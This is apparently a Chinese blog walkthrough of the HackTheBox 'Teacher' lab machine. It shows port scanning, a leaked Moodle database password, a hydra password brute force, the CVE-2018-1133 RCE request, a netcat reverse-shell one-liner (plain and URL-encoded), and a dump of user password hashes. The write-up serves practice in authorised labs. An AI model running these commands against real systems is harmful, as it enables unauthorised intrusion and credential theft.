@@ -1,0 +1,757 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crazyinside">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="先介绍一个估计也困扰很多同僚好久但无法解决问题的一个解决方案，这技巧也是我最近才从某位师傅口中了解得知。就是在每次获取的VPN文件中添加一行自己的代理地址. 1socks-proxy	127.0.0.1 7890    网络环境会有明显的改观。 我抛弃Windows已经很久了，现在应该算是一个标准的linux用户，记录靶机WP一方面是为了锻炼自身的熟练度，二方面是为了填充博客空虚的文章空间，三是为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Teacher">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Teacher/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="先介绍一个估计也困扰很多同僚好久但无法解决问题的一个解决方案，这技巧也是我最近才从某位师傅口中了解得知。就是在每次获取的VPN文件中添加一行自己的代理地址. 1socks-proxy	127.0.0.1 7890    网络环境会有明显的改观。 我抛弃Windows已经很久了，现在应该算是一个标准的linux用户，记录靶机WP一方面是为了锻炼自身的熟练度，二方面是为了填充博客空虚的文章空间，三是为">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220821192201834.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220821193228140.png">
+<meta property="og:image" content="https://www.worldisend.com/img/Teacher.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220821193442384.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220821194427859.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220821194516964.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220821194853327.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220821195201690.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220821200240208.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220821201646229.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.889Z">
+<meta property="article:modified_time" content="2022-08-22T07:36:17.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220821192201834.png">
+  
+  
+  
+  <title>HackTheBox-Teacher - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Teacher"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          78 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Teacher</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>先介绍一个估计也困扰很多同僚好久但无法解决问题的一个解决方案，这技巧也是我最近才从某位师傅口中了解得知。就是在每次获取的VPN文件中添加一行自己的代理地址.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socks-proxy	127.0.0.1 7890<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220821192201834.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220821192201834" style="zoom:200%;" />
+
+<p>网络环境会有明显的改观。</p>
+<p>我抛弃Windows已经很久了，现在应该算是一个标准的linux用户，记录靶机WP一方面是为了锻炼自身的熟练度，二方面是为了填充博客空虚的文章空间，三是为了配合相关的学习计划，以及无形之中培养的文档写作能力。用了段时间linux发现是真的香：</p>
+<p><img src="https://www.worldisend.com/img/image-20220821193228140.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220821193228140"></p>
+<p><img src="https://www.worldisend.com/img/Teacher.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload></p>
+<p>介于网络环境延迟虽然还是会有些许波动，但是大体环境还是挺稳定的:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ ping 10.10.10.153                                                                                              <br>PING 10.10.10.153 (10.10.10.153) 56(84) bytes of data.<br>64 bytes from 10.10.10.153: icmp_seq=1 ttl=63 time=103 ms<br>64 bytes from 10.10.10.153: icmp_seq=2 ttl=63 time=149 ms<br>64 bytes from 10.10.10.153: icmp_seq=3 ttl=63 time=272 ms<br>64 bytes from 10.10.10.153: icmp_seq=4 ttl=63 time=99.1 ms<br>64 bytes from 10.10.10.153: icmp_seq=5 ttl=63 time=114 ms<br>64 bytes from 10.10.10.153: icmp_seq=6 ttl=63 time=99.4 ms<br>64 bytes from 10.10.10.153: icmp_seq=7 ttl=63 time=96.3 ms<br></code></pre></td></tr></table></figure>
+
+<p>可以masscan进行扫描，漏扫的情况会少很多：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/Teacher$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.153<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-21 11:17:16 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.10.153        <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220821193442384.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220821193442384"></p>
+<p>默认页面是一个特别假的页面，很多按钮是都无法与之交互的。基本信息也是没有什么的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -I http://teacher.htb/                            <br>HTTP/1.1 200 OK<br>Date: Sun, 21 Aug 2022 11:35:10 GMT<br>Server: Apache/2.4.25 (Debian)<br>Last-Modified: Wed, 27 Jun 2018 02:53:22 GMT<br>ETag: <span class="hljs-string">&quot;1f5c-56f96b7bed26f&quot;</span><br>Accept-Ranges: bytes<br>Content-Length: 8028<br>Vary: Accept-Encoding<br>Content-Type: text/html<br></code></pre></td></tr></table></figure>
+
+<p>然后我用了一款新工具<a img src="https://www.kali.org/tools/skipfish/">skipfish</a>对目录进行枚举，中途感觉爬的差不多可以手动ctrl C 停止，该工具会将结果转换为可视化的html页面：</p>
+<p><img src="https://www.worldisend.com/img/image-20220821194427859.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220821194427859"></p>
+<p>它有将一张5.png的图片当成一个文本。我也觉得有趣，但是这图片是访问不了的：</p>
+<p><img src="https://www.worldisend.com/img/image-20220821194516964.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220821194516964"></p>
+<p>可能本身就是一个txt文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ wget http://teacher.htb/images/5.png                        <br>--2022-08-21 19:45:49--  http://teacher.htb/images/5.png<br>正在解析主机 teacher.htb (teacher.htb)... 10.10.10.153<br>正在连接 teacher.htb (teacher.htb)|10.10.10.153|:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：200 [image/png]<br>正在保存至: “5.png.1”<br><br>5.png.1                                                              100%[===================================================================================================================================================================&gt;]     200  --.-KB/s  用时 0s      <br><br>2022-08-21 19:45:49 (12.6 MB/s) - 已保存 “5.png.1” [200/200])<br><br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ <span class="hljs-built_in">cat</span> 5.png <br>Hi Servicedesk,<br><br>I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.<br><br>Could you guys figure out what the last charachter is, or just reset it?<br><br>Thanks,<br>Giovanni<br></code></pre></td></tr></table></figure>
+
+<p>一个用户名：Giovanni。一个密码字符串：Th4C00lTheacha，没有最后一位。紧接着还有一个 moodle 目录。应该是靶机的主题：<img src="https://www.worldisend.com/img/image-20220821194853327.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220821194853327"></p>
+<p>这个目录还伴随着大量的目录遍历文件泄露：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl http://teacher.htb/moodle/config.php.save  <br>&lt;?php  // Moodle configuration file<br><br><span class="hljs-built_in">unset</span>(<span class="hljs-variable">$CFG</span>);<br>global <span class="hljs-variable">$CFG</span>;<br><span class="hljs-variable">$CFG</span> = new stdClass();<br><br><span class="hljs-variable">$CFG</span>-&gt;dbtype    = <span class="hljs-string">&#x27;mariadb&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dblibrary = <span class="hljs-string">&#x27;native&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dbhost    = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dbname    = <span class="hljs-string">&#x27;moodle&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dbuser    = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dbpass    = <span class="hljs-string">&#x27;Welkom1!&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;prefix    = <span class="hljs-string">&#x27;mdl_&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dboptions = array (<br>  <span class="hljs-string">&#x27;dbpersist&#x27;</span> =&gt; 0,<br>  <span class="hljs-string">&#x27;dbport&#x27;</span> =&gt; 3306,<br>  <span class="hljs-string">&#x27;dbsocket&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;dbcollation&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8mb4_unicode_ci&#x27;</span>,<br>);<br><br><span class="hljs-variable">$CFG</span>-&gt;wwwroot   = <span class="hljs-string">&#x27;http://10.10.10.153/moodle&#x27;</span>; // CHANGE THIS - Gi<span class="hljs-variable">$CFG</span>-&gt;dataroot  = <span class="hljs-string">&#x27;/var/www/moodledata&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;admin     = <span class="hljs-string">&#x27;admin&#x27;</span>;<br><br><span class="hljs-variable">$CFG</span>-&gt;directorypermissions = 0777;<br><br>require_once(__DIR__ . <span class="hljs-string">&#x27;/lib/setup.php&#x27;</span>);<br><br>// There is no php closing tag <span class="hljs-keyword">in</span> this file,<br>// it is intentional because it prevents trailing whitespace problems!<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220821195201690.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220821195201690"></p>
+<p>登录框可以根据用户名Giovanni去尝试爆破，因为他自己说了他只是忘了最后一位：Th4C00lTheacha，可以用python快速生成，或者burp都行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -c <span class="hljs-string">&#x27;import string;print(&quot;\n&quot;.join([f&quot;Th4C00lTheacha&#123;c&#125;&quot; for c in string.printable[:-5]]))&#x27;</span> &gt; passwords<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ hydra -l Giovanni -P passwords 10.10.10.153 http-post-form <span class="hljs-string">&quot;/moodle/login/index.php:anchor=&amp;username=^USER^&amp;password=^PASS^&amp;rememberusername=1:Invalid login&quot;</span><br>Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-21 19:56:36<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 95 login tries (l:1/p:95), ~6 tries per task<br>[DATA] attacking http-post-form://10.10.10.153:80/moodle/login/index.php:anchor=&amp;username=^USER^&amp;password=^PASS^&amp;rememberusername=1:Invalid login<br>[80][http-post-form] host: 10.10.10.153   login: Giovanni   password: Th4C00lTheacha<span class="hljs-comment">#</span><br>1 of 1 target successfully completed, 16 valid passwords found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-21 19:56:38<br></code></pre></td></tr></table></figure>
+
+<p>这WEB应用确实有个RCE的漏洞，利用倒是不难，但是可难找了，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://teacher.htb/moodle/question/question.php?courseid=2&amp;sesskey=DOqbmippKA&amp;qtype=calculated&amp;returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&amp;cmid=7&amp;category=2&amp;addonpage=0&amp;appendqnumstring=addquestion<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220821200240208.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220821200240208"></p>
+<p>漏洞的地方是在这里，漏洞编号为CVE-2018-1133，具体漏洞细节我就不复制粘贴了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://blog.sonarsource.com/moodle-remote-code-execution/?redirect=rips<br></code></pre></td></tr></table></figure>
+
+<p>payload会因为后台错误交接直接演变为一个WebShell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&amp;appendqnumstring=addquestion&amp;scrollpos=0&amp;<span class="hljs-built_in">id</span>=7&amp;wizardnow=datasetitems&amp;cmid=7&amp;0=ping%20-c%201%2010.10.16.3<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo tcpdump -i tun0 icmp<br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes<br>20:06:48.989982 IP teacher.htb &gt; 10.10.16.3: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 3291, <span class="hljs-built_in">seq</span> 1, length 64<br>20:06:48.990014 IP 10.10.16.3 &gt; teacher.htb: ICMP <span class="hljs-built_in">echo</span> reply, <span class="hljs-built_in">id</span> 3291, <span class="hljs-built_in">seq</span> 1, length 64<br>20:06:49.088302 IP teacher.htb &gt; 10.10.16.3: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 3293, <span class="hljs-built_in">seq</span> 1, length 64<br>20:06:49.088321 IP 10.10.16.3 &gt; teacher.htb: ICMP <span class="hljs-built_in">echo</span> reply, <span class="hljs-built_in">id</span> 3293, <span class="hljs-built_in">seq</span> 1, length 64<br></code></pre></td></tr></table></figure>
+
+<p>编码反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.3 1337 &gt;/tmp/f<br><br><span class="hljs-built_in">rm</span>%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.16.3%201337%20%3E%2Ftmp%2Ff<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.153] 54248<br>sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ python3 -c &#x27;</span>import pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">www-data@teacher:/var/www/html/moodle/question$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">addquestion.php     engine           move_form.php   toggleflag.php</span><br><span class="hljs-string">behaviour           export.php       preview.php     type</span><br><span class="hljs-string">category.php        export_form.php  previewlib.php  upgrade.php</span><br><span class="hljs-string">category_class.php  flags.js         qengine.js      upgrade.txt</span><br><span class="hljs-string">category_form.php   format           question.php    yui</span><br><span class="hljs-string">classes             format.php       renderer.php</span><br><span class="hljs-string">edit.php            import.php       templates</span><br><span class="hljs-string">editlib.php         import_form.php  tests</span><br><span class="hljs-string">www-data@teacher:/var/www/html/moodle/question$ </span><br></code></pre></td></tr></table></figure>
+
+<p>刚刚是有拿到数据库泄露密码的，在moodle表里会有其他账号信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [moodle]&gt; select username,password from mdl_user;<br>select username,password from mdl_user;<br>+-------------+--------------------------------------------------------------+<br>| username    | password                                                     |<br>+-------------+--------------------------------------------------------------+<br>| guest       | $2y$10<span class="hljs-variable">$ywuE5gDlAlaCu9R0w7pKW</span>.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |<br>| admin       | $2y$10<span class="hljs-variable">$7VPsdU9</span>/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |<br>| giovanni    | $2y$10<span class="hljs-variable">$38V6kI7LNudORa7lBAT0q</span>.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |<br>| Giovannibak | 7a860966115182402ed06375cf0a22af                             |<br>+-------------+--------------------------------------------------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure>
+
+<p>最后一个是可以破解出来了的：</p>
+<p><img src="https://www.worldisend.com/img/image-20220821201646229.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220821201646229"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [moodle]&gt; <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br>Bye<br>www-data@teacher:/var/www/html/moodle/question$ su giovanni<br>su giovanni<br>Password: expelled<br><br>giovanni@teacher:/var/www/html/moodle/question$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>addquestion.php     engine           move_form.php   toggleflag.php<br>behaviour           export_form.php  previewlib.php  <span class="hljs-built_in">type</span><br>category_class.php  export.php       preview.php     upgrade.php<br>category_form.php   flags.js         qengine.js      upgrade.txt<br>category.php        format           question.php    yui<br>classes             format.php       renderer.php<br>editlib.php         import_form.php  templates<br>edit.php            import.php       tests<br>giovanni@teacher:/var/www/html/moodle/question$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>giovanni@teacher:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt  work<br>giovanni@teacher:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>2ad1e90bef00ffafee595084962b4111<br></code></pre></td></tr></table></figure>
+
